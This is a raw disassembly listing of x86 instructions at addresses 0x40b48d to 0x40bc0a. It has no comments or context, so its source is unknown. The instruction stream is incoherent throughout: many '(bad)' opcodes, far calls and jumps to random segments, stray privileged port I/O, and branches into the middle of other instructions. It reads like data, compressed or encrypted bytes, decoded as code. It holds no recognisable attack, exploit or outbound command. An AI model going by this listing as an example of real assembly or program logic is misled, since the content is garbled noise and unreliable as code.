  40b48d:	call   0x6168:0x6f3078ce
  40b494:	xchg   edi,eax
  40b495:	dec    edi
  40b496:	outs   dx,BYTE PTR ds:[esi]
  40b497:	jmp    0x9305439c
  40b49c:	in     al,0xd8
  40b49e:	out    dx,eax
  40b49f:	mov    ch,0xf
  40b4a1:	pop    es
  40b4a2:	lahf   
  40b4a3:	sbb    esi,DWORD PTR [esi-0x21]
  40b4a6:	je     0x40b475
  40b4a8:	loope  0x40b454
  40b4aa:	mov    al,ds:0x4dfc9b0c
  40b4af:	into   
  40b4b0:	push   ebp
  40b4b1:	sar    ebx,1
  40b4b3:	mov    al,0x88
  40b4b5:	adc    DWORD PTR [ecx-0x388be198],esp
  40b4bb:	cs sub al,0xd2
  40b4be:	in     al,dx
  40b4bf:	sub    bh,BYTE PTR [eax+ebx*1+0x9]
  40b4c3:	push   eax
  40b4c4:	pop    ebx
  40b4c5:	sub    al,0xe5
  40b4c7:	jecxz  0x40b4b8
  40b4c9:	mov    ecx,0xd312ddaf
  40b4ce:	call   0xb5ec:0x2b08764
  40b4d5:	jne    0x40b492
  40b4d7:	or     eax,0x714593c2
  40b4dc:	std    
  40b4dd:	add    eax,0xc441cd30
  40b4e2:	sbb    DWORD PTR ds:0x22a6cff,esp
  40b4e8:	retf   0x6d7b
  40b4eb:	(bad)  
  40b4ec:	cmp    ch,ch
  40b4ee:	arpl   WORD PTR [eax+0x4a],ax
  40b4f1:	mov    ch,0xc4
  40b4f3:	xchg   ebx,eax
  40b4f4:	pop    es
  40b4f5:	das    
  40b4f6:	add    DWORD PTR [edx+0xd45227e],edx
  40b4fc:	cmp    DWORD PTR [esi],ebx
  40b4fe:	cs inc ebx
  40b500:	aad    0x53
  40b502:	mov    eax,ds:0x39a5eeda
  40b507:	and    eax,ebx
  40b509:	jl     0x40b58a
  40b50b:	aad    0x1a
  40b50d:	stos   DWORD PTR es:[edi],eax
  40b50e:	(bad)  
  40b50f:	leave  
  40b510:	fldenv [esi-0x53cd5b0c]
  40b516:	mov    edi,0x20aa486b
  40b51b:	xchg   ecx,eax
  40b51c:	jmp    0x40b50c
  40b51e:	dec    esp
  40b51f:	int    0xd9
  40b521:	popa   
  40b522:	rcr    DWORD PTR [ebx+0x6],1
  40b525:	xchg   DWORD PTR [eax+0x3],ebx
  40b528:	xchg   edx,eax
  40b529:	xor    ch,BYTE PTR [edi]
  40b52b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b52c:	adc    eax,0x6cd8c4fa
  40b531:	adc    BYTE PTR [esi-0x5d],al
  40b534:	or     al,0x87
  40b536:	gs clc 
  40b538:	out    dx,eax
  40b539:	pop    esi
  40b53a:	push   0x4d1671cf
  40b53f:	shl    BYTE PTR [edx+0x6c],cl
  40b542:	fdivp  st(5),st
  40b544:	out    0xd8,al
  40b546:	jo     0x40b55e
  40b548:	pop    edx
  40b549:	adc    eax,0xe43cf459
  40b54e:	adc    al,0xa8
  40b550:	std    
  40b551:	fdiv   DWORD PTR [edi]
  40b553:	repz add edx,DWORD PTR [ebx+0x62cc0523]
  40b55a:	hlt    
  40b55b:	mov    al,ds:0x37a217f
  40b560:	jmp    0xb13e:0xbefc089c
  40b567:	stos   DWORD PTR es:[edi],eax
  40b568:	arpl   WORD PTR [esi],dx
  40b56a:	aam    0xd5
  40b56c:	push   esp
  40b56d:	adc    al,0xe5
  40b56f:	cmp    esi,ecx
  40b571:	enter  0x49da,0xc2
  40b575:	mov    ch,0x31
  40b577:	cld    
  40b578:	pop    ecx
  40b579:	mov    esp,0xb10adfde
  40b57e:	push   0x63
  40b580:	dec    ebp
  40b581:	adc    eax,0x7447d964
  40b586:	inc    esp
  40b587:	mov    dh,0xa
  40b589:	in     al,0xf4
  40b58b:	jo     0x40b5da
  40b58d:	fstp   TBYTE PTR [ecx-0x32]
  40b590:	(bad)  
  40b591:	sub    eax,0x24664c71
  40b596:	push   0x7b
  40b598:	xchg   bp,ax
  40b59a:	and    al,0x34
  40b59c:	sub    edx,esp
  40b59e:	ss ins DWORD PTR es:[edi],dx
  40b5a0:	dec    ebx
  40b5a1:	fld    DWORD PTR [edi+0x7f8a3d1e]
  40b5a7:	lea    ebp,[eax-0x75]
  40b5aa:	xchg   ebx,eax
  40b5ab:	jmp    0x3e73:0xd6eff6da
  40b5b2:	dec    ecx
  40b5b3:	sahf   
  40b5b4:	imul   esi,DWORD PTR [edx-0x76c544eb],0x2f539573
  40b5be:	les    ebx,FWORD PTR [esp+ecx*2-0x5062793f]
  40b5c5:	pop    ds
  40b5c6:	jo     0x40b59b
  40b5c8:	inc    ebp
  40b5c9:	ret    
  40b5ca:	clc    
  40b5cb:	lock mov ecx,0xd27c74d8
  40b5d1:	adc    eax,0xfdf8816a
  40b5d6:	and    al,0x2d
  40b5d8:	hlt    
  40b5d9:	inc    ecx
  40b5da:	je     0x40b5f3
  40b5dc:	imul   esp,ecx,0xbc046325
  40b5e2:	cmp    dh,BYTE PTR [ebx+0x4d9d1c4f]
  40b5e8:	mov    dh,0xfc
  40b5ea:	sbb    edi,DWORD PTR [ecx-0x10]
  40b5ed:	pop    eax
  40b5ee:	sar    edx,cl
  40b5f0:	mov    cl,0xe3
  40b5f2:	jl     0x40b5bf
  40b5f4:	fidivr DWORD PTR [esi+esi*8+0x34]
  40b5f8:	inc    ebx
  40b5f9:	add    ch,dl
  40b5fb:	xchg   esp,eax
  40b5fc:	sub    edi,DWORD PTR [esi+0x1727d58e]
  40b602:	jecxz  0x40b63d
  40b604:	sub    eax,0xee6e2e4e
  40b609:	sub    DWORD PTR ds:0xd78710c9,ecx
  40b60f:	ficom  DWORD PTR [ecx]
  40b611:	pslld  mm3,QWORD PTR [ebx+edi*2]
  40b615:	xchg   ebx,eax
  40b616:	ins    BYTE PTR es:[edi],dx
  40b617:	shl    cl,0x77
  40b61a:	push   ss
  40b61b:	inc    esi
  40b61c:	das    
  40b61d:	hlt    
  40b61e:	inc    ecx
  40b61f:	data16 cli 
  40b621:	xchg   ebx,eax
  40b622:	and    eax,0x275dc10
  40b627:	imul   ebp,DWORD PTR [esi],0x505c175f
  40b62d:	int    0xc6
  40b62f:	mov    eax,ebp
  40b631:	and    DWORD PTR [esi+ebp*2-0x40c649ce],ebx
  40b638:	cmp    al,0xd
  40b63a:	shl    DWORD PTR [esi],1
  40b63c:	ja     0x40b63a
  40b63e:	sbb    bh,BYTE PTR [esi+ebx*8-0x902b51d]
  40b645:	mov    edi,0xf936ed60
  40b64a:	mul    DWORD PTR [edi-0x1fc66e4a]
  40b650:	int3   
  40b651:	xor    ebx,eax
  40b653:	cmp    DWORD PTR [edi],esp
  40b655:	and    eax,0xc8ce2a2f
  40b65a:	outs   dx,DWORD PTR ds:[esi]
  40b65b:	bound  esi,QWORD PTR [edx+0x4d]
  40b65e:	and    BYTE PTR [edi-0x7f],dh
  40b661:	aam    0x31
  40b663:	xchg   edi,eax
  40b664:	rol    DWORD PTR [eax],0x4c
  40b667:	jns    0x40b677
  40b669:	dec    esi
  40b66a:	(bad)  
  40b66b:	xor    ah,BYTE PTR [ecx-0x2fd64d09]
  40b671:	daa    
  40b672:	bound  si,DWORD PTR [esi+0x36e3de1]
  40b679:	stos   BYTE PTR es:[edi],al
  40b67a:	shl    DWORD PTR [ebx+ebp*4+0x22],cl
  40b67e:	mov    al,0xfc
  40b680:	sbb    eax,0x832d8e46
  40b685:	ret    
  40b686:	fcomp  QWORD PTR [ebx-0x224e880a]
  40b68c:	xor    BYTE PTR [eax-0x4c858b51],ch
  40b692:	lea    edx,[eax+0x6e]
  40b695:	rcl    BYTE PTR [ebx-0x21371233],0xef
  40b69c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b69d:	push   ss
  40b69e:	popa   
  40b69f:	mov    ecx,0x1895c1f3
  40b6a4:	pop    esp
  40b6a5:	pop    ebx
  40b6a6:	repnz loope 0x40b647
  40b6a9:	call   0x6b695057
  40b6ae:	mov    al,0x2b
  40b6b0:	iret   
  40b6b1:	inc    ecx
  40b6b2:	popa   
  40b6b3:	adc    cl,BYTE PTR [edx+0x44]
  40b6b6:	jne    0x40b6c7
  40b6b8:	pop    eax
  40b6b9:	test   al,0xbe
  40b6bb:	stc    
  40b6bc:	pusha  
  40b6bd:	jmp    0xd64fc69b
  40b6c2:	das    
  40b6c3:	push   ss
  40b6c4:	xchg   edx,eax
  40b6c5:	jb     0x40b6b1
  40b6c7:	xor    cl,BYTE PTR [ecx+0x57]
  40b6ca:	sub    BYTE PTR [eax+0x4abff0d2],dl
  40b6d0:	xor    al,0x96
  40b6d2:	es es inc ecx
  40b6d5:	pop    edx
  40b6d6:	xor    al,0x7f
  40b6d8:	mov    dh,0x33
  40b6da:	scas   al,BYTE PTR es:[edi]
  40b6db:	stos   BYTE PTR es:[edi],al
  40b6dc:	adc    eax,0x2a4d549c
  40b6e1:	out    0x3e,al
  40b6e3:	cmp    BYTE PTR [ecx+0x8],bl
  40b6e6:	div    DWORD PTR [ebp+0x37]
  40b6e9:	add    ah,BYTE PTR [ecx+0x3ccc4311]
  40b6ef:	dec    edi
  40b6f0:	and    al,0x79
  40b6f2:	popa   
  40b6f3:	sbb    DWORD PTR [edi-0x62bc8d15],edi
  40b6f9:	ja     0x40b759
  40b6fb:	aad    0x60
  40b6fd:	call   0xb28d:0xbf90ae0
  40b704:	fsubr  DWORD PTR [ecx]
  40b706:	pop    esi
  40b707:	dec    edx
  40b708:	push   eax
  40b709:	inc    ecx
  40b70a:	loopne 0x40b711
  40b70c:	loopne 0x40b72f
  40b70e:	jb     0x40b6d9
  40b710:	aas    
  40b711:	cld    
  40b712:	fisttp WORD PTR [edx-0x7f]
  40b715:	mov    dl,0x14
  40b718:	pusha  
  40b719:	test   al,0xea
  40b71b:	sbb    al,0xae
  40b71d:	retf   
  40b71e:	scas   eax,DWORD PTR es:[edi]
  40b71f:	addr16 test ch,0x2b
  40b723:	xchg   al,ch
  40b725:	or     eax,0xd0335d18
  40b72a:	ja     0x40b752
  40b72c:	and    eax,0x2d7633db
  40b731:	lods   eax,DWORD PTR ds:[esi]
  40b732:	loop   0x40b799
  40b734:	retf   
  40b735:	sti    
  40b736:	loope  0x40b783
  40b738:	stc    
  40b739:	add    eax,0xc8c03801
  40b73e:	mov    ah,0xfd
  40b740:	dec    esi
  40b741:	jg     0x40b7a7
  40b743:	lods   al,BYTE PTR ds:[esi]
  40b744:	adc    cl,BYTE PTR [edx+ecx*4]
  40b747:	or     eax,0x23185d47
  40b74c:	pop    ss
  40b74d:	sub    esp,esi
  40b74f:	jge    0x40b727
  40b751:	loopne 0x40b7be
  40b753:	inc    ecx
  40b754:	clc    
  40b755:	xchg   edx,eax
  40b756:	aam    0xac
  40b758:	add    eax,0x82fe1b3f
  40b75d:	shl    ebx,1
  40b75f:	call   DWORD PTR [esi-0x6b]
  40b762:	xchg   DWORD PTR [edi-0x1b],edi
  40b765:	fistp  DWORD PTR [edx]
  40b767:	lods   eax,DWORD PTR ds:[esi]
  40b768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b769:	jo     0x40b771
  40b76b:	sub    esp,DWORD PTR [ecx-0x11]
  40b76e:	and    DWORD PTR ds:0xda534ff3,0xffffffbd
  40b775:	lock sub esp,ebp
  40b778:	xor    DWORD PTR [eax],0x2412b95f
  40b77e:	cli    
  40b77f:	xchg   edx,eax
  40b780:	mov    eax,0x6454f977
  40b785:	adc    dl,BYTE PTR [ebp+0x5e9b441c]
  40b78b:	ret    
  40b78c:	pop    esp
  40b78d:	stos   BYTE PTR es:[edi],al
  40b78e:	lock fs jecxz 0x40b76b
  40b792:	jmp    0x40b7fd
  40b794:	rcl    ch,1
  40b796:	or     bh,dh
  40b798:	push   ebx
  40b799:	aad    0xd8
  40b79b:	ins    BYTE PTR es:[edi],dx
  40b79c:	test   al,0x22
  40b79e:	inc    esi
  40b79f:	mov    bh,bh
  40b7a1:	adc    BYTE PTR [esp+eax*8],bl
  40b7a4:	jg     0x40b7e2
  40b7a6:	mov    al,ds:0xfb7a5f36
  40b7ab:	adc    DWORD PTR [edi-0x72],ebx
  40b7ae:	in     eax,dx
  40b7af:	pmulhuw mm2,QWORD PTR [ebx+0x74]
  40b7b3:	inc    ebx
  40b7b4:	call   0x6395:0x892e1a20
  40b7bb:	out    dx,al
  40b7bc:	jmp    0x61cce49c
  40b7c1:	ja     0x40b7d3
  40b7c3:	dec    eax
  40b7c4:	enter  0x4efc,0xf2
  40b7c8:	dec    eax
  40b7c9:	in     al,dx
  40b7ca:	push   es
  40b7cb:	fs inc ebp
  40b7cd:	or     cl,BYTE PTR [edi+0x35c17eac]
  40b7d3:	cli    
  40b7d4:	cmp    al,0xa5
  40b7d6:	out    0x36,al
  40b7d8:	pop    eax
  40b7d9:	mov    edi,0x683e031a
  40b7de:	sbb    al,0x8e
  40b7e0:	or     BYTE PTR [esi+0x78377660],dl
  40b7e6:	clc    
  40b7e7:	pop    eax
  40b7e8:	mov    dh,0x55
  40b7ea:	or     eax,0x94a0dd5e
  40b7ef:	jmp    0x40b773
  40b7f1:	sub    BYTE PTR [edi],bl
  40b7f3:	dec    ecx
  40b7f4:	push   ss
  40b7f5:	in     eax,0xa4
  40b7f7:	pop    ecx
  40b7f8:	cmp    al,0x6a
  40b7fa:	pop    esp
  40b7fb:	jmp    0x7f86fe39
  40b800:	add    BYTE PTR [edi-0x43],al
  40b803:	sub    al,0xf3
  40b805:	call   0xef53:0xfaa6600e
  40b80c:	aam    0x6f
  40b80e:	or     ch,BYTE PTR [edi]
  40b810:	push   esi
  40b811:	inc    esp
  40b812:	push   ds
  40b813:	mov    ecx,0x7f492071
  40b818:	in     eax,0x47
  40b81a:	mov    ah,0x5b
  40b81c:	xor    esp,0xfffffff6
  40b81f:	cmp    eax,0x60f287f4
  40b824:	mov    ?,WORD PTR [ebp-0x3f4d8afa]
  40b82a:	adc    al,0x86
  40b82c:	ret    0x54b2
  40b82f:	jns    0x40b7ca
  40b831:	jns    0x40b7ea
  40b833:	shl    DWORD PTR [esi+0x11c7c4],1
  40b839:	jne    0x40b8a9
  40b83b:	sahf   
  40b83c:	scas   al,BYTE PTR es:[edi]
  40b83d:	xchg   DWORD PTR [edx-0x55037ad3],esp
  40b843:	ja     0x40b81e
  40b845:	clc    
  40b846:	dec    eax
  40b847:	push   ebp
  40b848:	fucomip st,st(7)
  40b84a:	xor    al,BYTE PTR [ecx]
  40b84c:	xlat   BYTE PTR ds:[ebx]
  40b84d:	jmp    0x40b886
  40b84f:	imul   ebx,DWORD PTR [ecx],0xf13133b4
  40b855:	mov    ebx,0x24a5c85f
  40b85a:	imul   ebx,DWORD PTR [ebx],0x1b6bfe7b
  40b860:	add    eax,ebx
  40b862:	stc    
  40b863:	ins    DWORD PTR es:[edi],dx
  40b864:	(bad)  
  40b865:	xchg   edi,eax
  40b866:	fsub   QWORD PTR [edx+ebp*2+0xd]
  40b86a:	mov    ss:0x141cd10f,al
  40b870:	arpl   WORD PTR [ecx-0x9dcd8b3],bp
  40b876:	jg     0x40b87c
  40b878:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40b87a:	cs push ecx
  40b87c:	fcomp  QWORD PTR ds:0x71c8a4e4
  40b882:	imul   BYTE PTR [ecx-0x26fbeb72]
  40b888:	imul   esp,ebp,0x52
  40b88b:	outs   dx,DWORD PTR ds:[esi]
  40b88c:	sbb    al,0x6d
  40b88e:	mov    ch,0x54
  40b890:	mov    dl,0x97
  40b892:	sub    edx,0x547a4be6
  40b898:	aaa    
  40b899:	mov    eax,0x6e9d9523
  40b89e:	sub    al,0xf0
  40b8a0:	push   0xbcc81b53
  40b8a5:	lock lock inc esp
  40b8a8:	ss pop ds
  40b8aa:	rol    BYTE PTR [ecx+0x346de9d6],cl
  40b8b0:	mov    eax,ss
  40b8b2:	aas    
  40b8b3:	shr    DWORD PTR ds:0x919cf761,1
  40b8b9:	dec    ecx
  40b8ba:	pop    esp
  40b8bb:	lods   al,BYTE PTR ds:[esi]
  40b8bc:	push   es
  40b8bd:	aas    
  40b8be:	ds out dx,eax
  40b8c0:	loopne 0x40b940
  40b8c2:	dec    esp
  40b8c3:	push   ss
  40b8c4:	jp     0x40b8d6
  40b8c6:	mov    BYTE PTR [edi-0x2ce3c64e],al
  40b8cc:	mov    eax,0x102aa19b
  40b8d1:	jp     0x40b941
  40b8d3:	inc    ebx
  40b8d4:	idiv   DWORD PTR [ecx+eax*1-0x44]
  40b8d8:	sbb    edi,DWORD PTR [edx-0x40]
  40b8db:	push   esi
  40b8dc:	in     eax,0x23
  40b8de:	out    0xfb,al
  40b8e0:	sub    BYTE PTR [ecx],ah
  40b8e2:	xchg   BYTE PTR [esi],bl
  40b8e4:	lock aad 0x40
  40b8e7:	out    0xa1,eax
  40b8e9:	push   edi
  40b8ea:	mov    al,0x7f
  40b8ec:	(bad)  
  40b8ed:	in     al,dx
  40b8ee:	imul   ebx,DWORD PTR [eax-0x1f],0x29
  40b8f2:	and    BYTE PTR [ecx+0x3b],dh
  40b8f5:	inc    esp
  40b8f6:	xor    eax,0xe52185a3
  40b8fb:	jae    0x40b91c
  40b8fd:	lock ret 
  40b8ff:	sbb    ebp,eax
  40b901:	cmp    al,0x27
  40b903:	das    
  40b904:	lods   al,BYTE PTR ds:[esi]
  40b905:	mov    ebp,0xdaa14d5d
  40b90a:	nop
  40b90b:	jo     0x40b92b
  40b90d:	xchg   edx,eax
  40b90e:	dec    edi
  40b90f:	jmp    0x40b8f6
  40b911:	fadd   DWORD PTR [ebp-0x7f]
  40b914:	cdq    
  40b915:	mov    esp,0x15ae37b3
  40b91a:	out    0x8f,al
  40b91c:	arpl   WORD PTR [eax],di
  40b91e:	mov    BYTE PTR [ebx],0xa7
  40b921:	cmp    DWORD PTR [ebx+0x2c8450],esi
  40b927:	enter  0x8a45,0x26
  40b92b:	cmp    edi,DWORD PTR [edx+eax*2-0x6b]
  40b92f:	cmc    
  40b930:	inc    esi
  40b931:	sbb    BYTE PTR [edi+edi*2+0x4329feaf],cl
  40b938:	mov    al,ds:0x4df84a50
  40b93d:	ins    DWORD PTR es:[edi],dx
  40b93e:	and    al,0xfa
  40b940:	cmp    al,0x39
  40b942:	ret    
  40b943:	shl    edi,cl
  40b945:	mov    ds:0x6a47b268,eax
  40b94a:	sti    
  40b94b:	mov    ds:0x9a311a16,eax
  40b950:	div    bl
  40b952:	or     eax,0x9776d416
  40b957:	loope  0x40b9a7
  40b959:	js     0x40b9d5
  40b95b:	loope  0x40b9c3
  40b95d:	ja     0x40b928
  40b95f:	xor    bl,BYTE PTR [edi]
  40b961:	inc    ecx
  40b962:	aad    0xee
  40b964:	sub    esi,esp
  40b966:	stos   DWORD PTR es:[edi],eax
  40b967:	add    eax,0xd95dc745
  40b96c:	imul   DWORD PTR ds:[ebp+0x7a20a0f]
  40b973:	out    0x1b,eax
  40b975:	xchg   DWORD PTR [esi],edx
  40b977:	xor    ah,BYTE PTR [eax+eax*2]
  40b97a:	lea    ebx,[esi]
  40b97c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b97d:	test   al,0x5f
  40b97f:	icebp  
  40b980:	dec    ebx
  40b981:	sub    edi,esp
  40b983:	or     ebp,DWORD PTR [edi-0x7e8bd4b9]
  40b989:	(bad)  [edx]
  40b98b:	jne    0x40ba04
  40b98d:	jno    0x40b9ff
  40b98f:	aaa    
  40b990:	fnstcw WORD PTR [ebx+ecx*8]
  40b993:	pop    edi
  40b994:	add    BYTE PTR [ebx-0x61],al
  40b997:	dec    ecx
  40b998:	jmp    0x40b974
  40b99a:	sub    edx,DWORD PTR [ebx-0x64640e39]
  40b9a0:	mov    BYTE PTR [ebp-0x43],ch
  40b9a3:	push   ds
  40b9a4:	jg     0x40b98d
  40b9a6:	loop   0x40b942
  40b9a8:	sub    ax,0x679f
  40b9ac:	add    BYTE PTR [ebp+edx*8+0x35255021],0x67
  40b9b4:	xchg   esi,ebp
  40b9b6:	mov    cl,0x29
  40b9b8:	dec    edi
  40b9b9:	xor    BYTE PTR [eax],ch
  40b9bb:	fldln2 
  40b9bd:	lea    edx,[edi-0x6a]
  40b9c0:	inc    esp
  40b9c1:	ret    0x58f1
  40b9c4:	pop    ebp
  40b9c5:	sub    DWORD PTR [ebx+0x4e799b28],ebx
  40b9cb:	push   eax
  40b9cc:	dec    ebp
  40b9ce:	sub    DWORD PTR [esi-0x23],ebx
  40b9d1:	mov    DWORD PTR [eax],edx
  40b9d3:	dec    esi
  40b9d4:	ds dec esi
  40b9d6:	fidiv  WORD PTR [esi]
  40b9d8:	int3   
  40b9d9:	lods   eax,DWORD PTR ds:[esi]
  40b9da:	rcl    DWORD PTR [edi+0x35],1
  40b9dd:	pusha  
  40b9de:	aad    0x9d
  40b9e0:	inc    ecx
  40b9e1:	jae    0x40b9f1
  40b9e3:	fbstp  TBYTE PTR [esi]
  40b9e5:	(bad)  
  40b9e6:	mov    DWORD PTR [esi],ebx
  40b9e8:	xor    ah,dl
  40b9ea:	mov    ch,BYTE PTR [ecx-0x5943a650]
  40b9f0:	arpl   WORD PTR [bp+0x66],cx
  40b9f4:	and    cl,al
  40b9f6:	xor    BYTE PTR [edi+0x34],0x8c
  40b9fa:	xchg   edi,eax
  40b9fb:	sub    ch,BYTE PTR [ebx-0x2f]
  40b9fe:	inc    esp
  40b9ff:	mov    ecx,DWORD PTR [eax-0xf380a26]
  40ba05:	inc    eax
  40ba06:	jno    0x40ba11
  40ba08:	mov    ds:0x783b38e0,al
  40ba0d:	popf   
  40ba0e:	mov    al,0xc1
  40ba10:	dec    eax
  40ba11:	lock sbb edi,DWORD PTR es:[edx]
  40ba15:	xchg   DWORD PTR [ebp-0x43],edi
  40ba18:	mov    esp,DWORD PTR [ebp+0x694d92bb]
  40ba1e:	out    dx,al
  40ba1f:	scas   al,BYTE PTR es:[edi]
  40ba20:	add    bl,BYTE PTR [ebx-0x21]
  40ba23:	retf   
  40ba24:	mov    ?,WORD PTR fs:[esi]
  40ba27:	loope  0x40ba54
  40ba29:	xchg   esp,eax
  40ba2a:	or     eax,0xacd75a4c
  40ba2f:	mul    esi
  40ba31:	cmp    DWORD PTR [ebx],edx
  40ba33:	data16 arpl cx,sp
  40ba36:	rcr    BYTE PTR [ecx-0x1b],cl
  40ba39:	loop   0x40ba59
  40ba3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba3c:	(bad)  
  40ba3d:	jle    0x40b9d4
  40ba3f:	js     0x40b9ef
  40ba41:	mov    WORD PTR [edx],es
  40ba43:	nop
  40ba44:	in     eax,0xfb
  40ba46:	adc    eax,0xf46caa71
  40ba4b:	(bad)  
  40ba4c:	shr    DWORD PTR [esi-0x2d],1
  40ba4f:	addr16 jmp 0x9921e166
  40ba55:	in     al,0xbc
  40ba57:	aaa    
  40ba58:	(bad)  
  40ba59:	(bad)  
  40ba5b:	sbb    ah,BYTE PTR [ebx+0x49]
  40ba5e:	inc    eax
  40ba5f:	mov    ds,WORD PTR [esi-0x2db97888]
  40ba65:	mov    eax,ds:0x8f03e8f
  40ba6a:	movq   mm3,QWORD PTR [eax-0x1024dfd9]
  40ba71:	jmp    DWORD PTR [ebx+0x5c5b4df0]
  40ba77:	sub    ch,bl
  40ba79:	fwait
  40ba7a:	jb     0x40ba3c
  40ba7c:	and    DWORD PTR [eax-0x5],edx
  40ba7f:	adc    esi,ecx
  40ba81:	ins    DWORD PTR es:[edi],dx
  40ba82:	cmp    BYTE PTR [ecx-0x74],dl
  40ba85:	cmp    ecx,esi
  40ba87:	int    0xee
  40ba89:	jge    0x40ba29
  40ba8b:	call   0x525c0ad9
  40ba90:	jbe    0x40baa4
  40ba92:	shl    edx,1
  40ba94:	sbb    BYTE PTR [edi+0x7888cfac],0x23
  40ba9b:	retf   0xdf53
  40ba9e:	sub    BYTE PTR [edi+0x21],0x6
  40baa2:	fild   WORD PTR [edi]
  40baa4:	adc    al,0x6e
  40baa6:	retf   
  40baa7:	add    DWORD PTR [edx],0x454bed3b
  40baad:	enter  0xabd8,0xbb
  40bab1:	push   ebx
  40bab2:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40bab4:	push   edx
  40bab5:	pop    esp
  40bab6:	inc    eax
  40bab7:	xchg   esp,eax
  40bab8:	add    DWORD PTR [eax],edi
  40baba:	hlt    
  40babb:	icebp  
  40babc:	dec    esi
  40babd:	les    edx,FWORD PTR [ebx]
  40babf:	push   ebp
  40bac0:	xor    DWORD PTR [ebx],ebp
  40bac2:	mov    eax,ds:0x4aa24fe1
  40bac7:	xor    bh,BYTE PTR [ecx+0x6]
  40baca:	faddp  st(7),st
  40bacc:	push   edi
  40bacd:	repnz aas 
  40bacf:	ja     0x40ba76
  40bad1:	mov    ds:0x87aaa7f4,eax
  40bad6:	ret    
  40bad7:	aad    0x25
  40bad9:	mov    edi,0x8f5c37eb
  40bade:	dec    edi
  40badf:	test   al,0x9a
  40bae1:	xor    esi,DWORD PTR [edi]
  40bae3:	aaa    
  40bae4:	popa   
  40bae5:	in     eax,dx
  40bae6:	mul    BYTE PTR [ebx-0x3fbd12d5]
  40baec:	dec    ecx
  40baed:	xchg   eax,esi
  40baef:	inc    ebx
  40baf0:	repnz mov BYTE PTR [edi+0x13],al
  40baf4:	cld    
  40baf5:	js     0x40baeb
  40baf7:	and    BYTE PTR [ecx],ch
  40baf9:	jo     0x40bb4f
  40bafb:	imul   ecx,edi,0x2cced033
  40bb01:	pop    edi
  40bb02:	cld    
  40bb03:	pop    esp
  40bb04:	loope  0x40bae5
  40bb06:	mov    ah,0x6a
  40bb08:	dec    edi
  40bb09:	nop
  40bb0a:	mov    ebx,DWORD PTR [eax+edx*4-0x6a]
  40bb0e:	ins    DWORD PTR es:[edi],dx
  40bb0f:	fwait
  40bb10:	int    0x4a
  40bb12:	sbb    cl,BYTE PTR [ecx+ebx*2]
  40bb15:	push   0xfffffff3
  40bb17:	jmp    0x40bae3
  40bb19:	ss aam 0xb
  40bb1c:	clc    
  40bb1d:	jb     0x40baa8
  40bb1f:	cmp    bl,0xa4
  40bb22:	rcr    DWORD PTR [edi+edx*8-0x42ed6632],0x53
  40bb2a:	cdq    
  40bb2b:	loop   0x40bab6
  40bb2d:	jno    0x40baef
  40bb2f:	sbb    dh,BYTE PTR [ecx]
  40bb31:	gs out 0x9e,eax
  40bb34:	sub    eax,edx
  40bb36:	xor    BYTE PTR ss:[edi-0x566b1bfb],ch
  40bb3d:	push   edi
  40bb3e:	jg     0x40bb4b
  40bb40:	fisttp WORD PTR [eax+0x7bb3b57f]
  40bb46:	pop    ebp
  40bb47:	fdivr  QWORD PTR [ebx-0x2ebfd268]
  40bb4d:	aaa    
  40bb4e:	xchg   edx,eax
  40bb4f:	test   eax,0x9b468ded
  40bb54:	cmp    eax,0x3d9ad704
  40bb59:	pop    edi
  40bb5a:	out    dx,eax
  40bb5b:	dec    eax
  40bb5c:	mov    esi,0x4e37d88
  40bb61:	and    eax,0xff714b35
  40bb66:	push   cs
  40bb67:	fst    QWORD PTR [ebp-0x5fa14283]
  40bb6d:	push   ds
  40bb6e:	sbb    eax,0x4475d528
  40bb73:	push   ds
  40bb74:	int3   
  40bb75:	test   al,0x62
  40bb77:	and    DWORD PTR [edx+0x34676fbf],esi
  40bb7d:	xchg   BYTE PTR [edi+ebx*8],cl
  40bb80:	inc    eax
  40bb81:	icebp  
  40bb82:	shl    DWORD PTR [ebp+edi*4-0x3a],cl
  40bb86:	fnsetpm(287 only) 
  40bb88:	inc    ecx
  40bb89:	pop    ss
  40bb8a:	adc    DWORD PTR [ebx-0x1993f2f],esi
  40bb90:	jp     0x40bb78
  40bb92:	add    ebp,ebx
  40bb94:	ret    
  40bb95:	sbb    al,BYTE PTR [edi+0x4ef481a2]
  40bb9b:	adc    eax,0x4fdc425e
  40bba0:	add    esi,DWORD PTR [ebx]
  40bba2:	sub    al,0x14
  40bba4:	cmp    bl,ah
  40bba6:	out    dx,al
  40bba7:	out    0x2e,eax
  40bba9:	push   0x5c
  40bbab:	scas   eax,DWORD PTR es:[edi]
  40bbac:	push   DWORD PTR [ebx]
  40bbae:	mov    eax,ds:0x7f8e5099
  40bbb3:	jns    0x40bc02
  40bbb5:	jns    0x40bb81
  40bbb7:	stos   DWORD PTR es:[edi],eax
  40bbb8:	mov    bh,0xcd
  40bbba:	ss jl  0x40bbc6
  40bbbd:	pop    ebp
  40bbbe:	mov    al,0xbe
  40bbc0:	jg     0x40bbb2
  40bbc2:	jecxz  0x40bb8b
  40bbc4:	push   edi
  40bbc5:	jae    0x40bb7f
  40bbc7:	rol    BYTE PTR [eax-0x642d6203],cl
  40bbcd:	pop    esp
  40bbce:	imul   edx,ebx,0xcab12c20
  40bbd4:	int3   
  40bbd5:	pop    esi
  40bbd6:	push   0xffffffcf
  40bbd8:	out    0x40,al
  40bbda:	enter  0xd11e,0x20
  40bbde:	mov    ch,0xb4
  40bbe0:	fstp   TBYTE PTR [ebx+0x1a]
  40bbe3:	dec    ebx
  40bbe4:	in     al,0xa6
  40bbe6:	add    ebp,DWORD PTR [edx+0x64ebf3df]
  40bbec:	(bad)  
  40bbed:	aaa    
  40bbee:	rcr    DWORD PTR [edx+0x19d4b9e1],cl
  40bbf4:	add    BYTE PTR [edx],cl
  40bbf6:	out    dx,al
  40bbf7:	dec    ecx
  40bbf8:	ret    
  40bbf9:	xor    eax,0x9bb8be69
  40bbfe:	loop   0x40bbb8
  40bc00:	in     eax,0xe8
  40bc02:	xor    BYTE PTR [eax-0x1c334da2],ah
  40bc08:	scas   al,BYTE PTR es:[edi]
  40bc09:	xchg   ebp,eax
  40bc0a:	sbb    BYTE PTR [eax-0x31c6f90c],bl
